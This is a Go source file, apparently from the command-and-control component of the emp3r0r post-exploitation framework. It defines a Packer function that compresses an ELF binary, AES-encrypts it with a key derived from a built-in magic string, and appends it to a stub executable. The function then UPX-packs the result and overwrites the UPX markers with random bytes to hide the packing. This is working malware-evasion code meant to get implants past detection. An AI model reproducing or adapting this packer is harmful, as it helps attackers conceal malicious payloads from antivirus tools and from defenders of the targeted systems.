//go:build linux
// +build linux

package cc

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

// Packer compress and encrypt ELF, append it to packer_stub.exe
// encryption key is generated from MagicString
func Packer(inputELF string) (err error) {
	magic_str := emp3r0r_data.MagicString

	// read file
	elfBytes, err := ioutil.ReadFile(inputELF)
	if err != nil {
		return fmt.Errorf("Read %s: %v", inputELF, err)
	}
	origSize := float32(len(elfBytes))
	CliPrintInfo("ELF size: %d bytes", int(origSize))
	var compressedBytes []byte

	// compress
	gz := &archiver.Gz{CompressionLevel: 9}
	r, err := os.Open(inputELF)
	if err != nil {
		return fmt.Errorf("Open %s: %v", inputELF, err)
	}
	bufCompress := bytes.NewBuffer(compressedBytes)
	err = gz.Compress(r, bufCompress)
	if err != nil {
		return fmt.Errorf("Compress ELF: %v", err)
	}
	newSize := float32(bufCompress.Len())
	CliPrintInfo("ELF compressed: %d bytes (%.2f%%)", int(newSize), (newSize/origSize)*100)

	// encrypt
	key := tun.GenAESKey(magic_str)
	encELFBytes := tun.AESEncryptRaw(key, bufCompress.Bytes())
	if encELFBytes == nil {
		return fmt.Errorf("failed to encrypt %s", inputELF)
	}

	// append to stub
	stub_file := emp3r0r_data.Packer_Stub
	packed_file := fmt.Sprintf("%s.packed.exe", inputELF)
	toWrite, err := ioutil.ReadFile(stub_file)
	if err != nil {
		return fmt.Errorf("cannot read %s: %v", stub_file, err)
	}
	toWrite = append(toWrite, encELFBytes...)
	err = ioutil.WriteFile(packed_file, toWrite, 0755)
	if err != nil {
		return fmt.Errorf("write to packed file %s: %v", packed_file, err)
	}

	// upx
	if util.IsCommandExist("upx") {
		CliPrintInfo("Using upx to further compress the executable %s", packed_file)
		cmd := exec.Command("upx", "-9", packed_file)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Errorf("Packer: upx: %s (%v)", out, err)
		}
	}

	// remove "UPX" strings
	util.ReplaceBytesInFile(packed_file, []byte("UPX"), util.RandBytes(3))
	util.ReplaceBytesInFile(packed_file, []byte("upx"), util.RandBytes(3))

	// done
	CliPrintSuccess("%s has been packed as %s", inputELF, packed_file)
	return
}
